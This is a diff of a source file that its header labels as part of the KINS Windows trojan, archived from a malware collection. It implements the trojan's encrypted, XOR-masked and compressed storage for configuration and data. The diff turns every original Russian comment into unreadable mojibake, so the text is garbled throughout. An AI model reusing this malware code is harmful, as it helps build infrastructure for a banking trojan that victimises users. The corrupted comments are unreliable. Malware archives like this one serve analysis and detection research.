@@ -1,15 +1,26 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "binstorage.h"
 
-#define SHF_REMOVED 0x1 //Элемент удален.
+#define SHF_REMOVED 0x1 //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
 #pragma pack(push, 1)
-//Заголовок для элемента в хранилище.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
-  DWORD size;  //Размер элемента.
-  BYTE flags;  //Флаги SHF_*.
+  DWORD size;  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  BYTE flags;  //пїЅпїЅпїЅпїЅпїЅ SHF_*.
 }STORAGEARRAYHEADER;
 #pragma pack(pop)
 
@@ -40,13 +51,13 @@ BinStorage::STORAGE *BinStorage::_createEmpty(void)
 bool BinStorage::_addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize)
 {
   DWORD newStorageSize = (*binStorage)->size + sizeof(ITEM) + dataSize;
-  if(newStorageSize > (*binStorage)->size /*не пошло ли по кругу*/ && id > 0 && Mem::reallocEx(binStorage, newStorageSize))
+  if(newStorageSize > (*binStorage)->size /*пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ*/ && id > 0 && Mem::reallocEx(binStorage, newStorageSize))
   {
     STORAGE *p = *binStorage;
     ITEM *item = (ITEM *)(((LPBYTE)p) + p->size);
     LPBYTE dest = (LPBYTE)(item) + sizeof(ITEM);
       
-    //Сжимаем.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(dataSize == 0)flags &= ~ITEMF_COMPRESSED;
 
     if(flags & ITEMF_COMPRESSED)
@@ -115,7 +126,7 @@ bool BinStorage::_modifyItem(STORAGE **binStorage, ITEM *item, DWORD flags, void
   if(newBinStorage != NULL)
   {
     newBinStorage->size = itemOffset;
-    newBinStorage->count--; //Т.к. на прежнее значение его вернет _addItem().
+    newBinStorage->count--; //пїЅ.пїЅ. пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ _addItem().
     
     if(_addItem(&newBinStorage, item->id, flags, data, dataSize))
     {
@@ -227,9 +238,9 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
   ITEM *curItem = NULL;
 
   /*
-    Приминение флагов ITEMF_COMBINE_*.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ITEMF_COMBINE_*.
     
-    FIXME: Разработать оптимизацию даже при !(dwFlags & PACKF_FINAL_MODE).
+    FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ !(dwFlags & PACKF_FINAL_MODE).
   */
   if(flags & PACKF_FINAL_MODE)while((curItem = _getNextItem(oldStorage, curItem)))if(curItem->id > 0)
   {
@@ -239,10 +250,10 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
       continue;
     }
 
-    //Снимаем маску.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     curItem->flags &= ~ITEMF_COMBINE_MASK;
 
-    //Применяем маску.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     DWORD itemMask = curItem->flags & ITEMF_IS_MASK;
     ITEM *cloneOfItem = curItem;
     while((cloneOfItem = _getNextItem(oldStorage, cloneOfItem)))if(cloneOfItem->id == curItem->id && (cloneOfItem->flags & ITEMF_IS_MASK) == itemMask)
@@ -258,7 +269,7 @@ DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key
     }
   }
   
-  //Создаем чистый список.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   STORAGE *newStorage;
   if((newStorage = _createEmpty()))
   {
@@ -314,7 +325,7 @@ DWORD BinStorage::_unpack(STORAGE **binStorage, void *data, DWORD dataSize, Cryp
 {
   if(dataSize >= sizeof(STORAGE) && dataSize <= BINSTORAGE_MAX_SIZE)
   {
-    //Делаем копию ключа.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     Crypt::RC4KEY key;
     if(rc4Key)Mem::_copy(&key, rc4Key, sizeof(Crypt::RC4KEY));
     
@@ -389,7 +400,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
   DWORD creationDisposition;
   bool retVal = false;
   
-  //Права доступа.
+  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(flags & OSF_WRITE_ACCESS)
   {
     desiredAccess       |= GENERIC_WRITE;
@@ -400,7 +411,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
     creationDisposition = OPEN_EXISTING;
   }
   
-  //Открываем файл.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   storageArray->file = CWA(kernel32, CreateFileW)(fileName, desiredAccess, FILE_SHARE_READ, NULL, creationDisposition, FILE_ATTRIBUTE_NORMAL, NULL);
   if(storageArray->file != INVALID_HANDLE_VALUE)
   {
@@ -411,7 +422,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
       if(fileSize == 0)retVal = true;
       else
       {
-        //Проверка на ошибки.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         STORAGEARRAYHEADER sh;
         DWORD readed;
         DWORD64 offset = 0, newOffset;
@@ -420,7 +431,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
         {
           if(!CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &readed, NULL))
           {
-            //Не удалось прочитать файл.
+            //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
             #if defined(WDEBUG3)
             WDEBUG3(WDDT_ERROR, "(1)Failed to read \"%s\", position %I64u, size %I64u", fileName, Fs::_getFilePointer(storageArray->file), fileSize);
             #endif
@@ -428,35 +439,35 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
             goto CHECK_END;
           }
           
-          //EOF. Файл успешно прочитан.
+          //EOF. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if(readed == 0)
           {
             retVal = true;
             goto CHECK_END; 
           }
           
-          //Если не удалось прочитать размер
+          //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
           if(readed != sizeof(STORAGEARRAYHEADER))
           {
             #if defined(WDEBUG4)
             WDEBUG4(WDDT_ERROR, "(2)Failed to read file \"%s\", position %I64u, size %I64u, readed=%u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, readed);
             #endif
             
-            //Восстанавливаем до конца предидущей конигурации.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             goto RESTORE_FILE1;
           }
           
           sh.size  ^= storageArray->xorKey;
           newOffset = offset + sizeof(STORAGEARRAYHEADER) + sh.size;
           
-          //Файл поврежден.
+          //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if(newOffset > fileSize || sh.size > BINSTORAGE_MAX_SIZE)
           {
             #if defined(WDEBUG4)
             WDEBUG4(WDDT_ERROR, "(2)File corrupted \"%s\", position %I64u, size %I64u, newOffset=%I64u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, newOffset);
             #endif
             
-            //Восстанавливаем до конца предидущей конигурации.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             goto RESTORE_FILE1;
           }
           
@@ -473,7 +484,7 @@ bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *s
         }
 
 RESTORE_FILE1:
-        //Восстанавливаем до конца текушей конфигурации.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(flags & OSF_WRITE_ACCESS && Fs::_setFilePointer(storageArray->file, offset, FILE_BEGIN) && CWA(kernel32, SetEndOfFile)(storageArray->file))retVal = true;  
 
 CHECK_END:;
@@ -514,12 +525,12 @@ bool BinStorage::_addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStor
       {
         DWORD written;
 
-        //Создаем заголовок.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         STORAGEARRAYHEADER sh;
         Mem::_zero(&sh, sizeof(STORAGEARRAYHEADER));
         sh.size = size ^ storageArray->xorKey;
 
-        //Пишим.    
+        //пїЅпїЅпїЅпїЅпїЅ.    
         if(CWA(kernel32, WriteFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &written, NULL) && written == sizeof(STORAGEARRAYHEADER) &&
            CWA(kernel32, WriteFile)(storageArray->file, binStorage, size, &written, NULL) && written == size)
         {
@@ -527,7 +538,7 @@ bool BinStorage::_addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStor
         }
         else
         {
-          //Восстанавливаем конец файла.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
           Fs::_setFilePointer(storageArray->file, curOffset, FILE_BEGIN);
           CWA(kernel32, SetEndOfFile)(storageArray->file);
         }
@@ -557,7 +568,7 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
     DWORD64 curItem = Fs::_getFilePointer(storageArray->file);
     if(!CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &readed, NULL))
     {
-      //Не удалось прочитать файл.
+      //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 #     if defined(WDEBUG1)
       WDEBUG1(WDDT_ERROR, "(1)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
 #     endif
@@ -571,17 +582,17 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
       return true;
     }
   
-    //Если не удалось прочитать размер
+    //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     if(readed != sizeof(STORAGEARRAYHEADER))
     {
-      //Не удалось прочитать файл.
+      //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 #     if defined(WDEBUG1)
       WDEBUG1(WDDT_ERROR, "(2)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
 #     endif
       break;
     }
     
-    //Получаем размер.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     sh.size ^= storageArray->xorKey;
     if(sh.size > BINSTORAGE_MAX_SIZE)
     {
@@ -591,7 +602,7 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
       break;
     }
     
-    //Проверяем не удален ли элемент.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(sh.flags & SHF_REMOVED || sh.size == 0)
     {
       if(!Fs::_setFilePointer(storageArray->file, sh.size, FILE_CURRENT))
@@ -604,13 +615,13 @@ bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **
       continue;
     }
     
-    //Выделяем память
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     void *p = Mem::alloc(sh.size);
     if(p == NULL)break;
   
     if(!CWA(kernel32, ReadFile)(storageArray->file, p, sh.size, &readed, NULL) || readed != sh.size || (readed = _unpack(NULL, p, sh.size, rc4Key)) == 0)
     {
-      //Не удалось прочитать файл.
+      //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 #     if defined(WDEBUG1)
       WDEBUG1(WDDT_ERROR, "(5)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
 #     endif
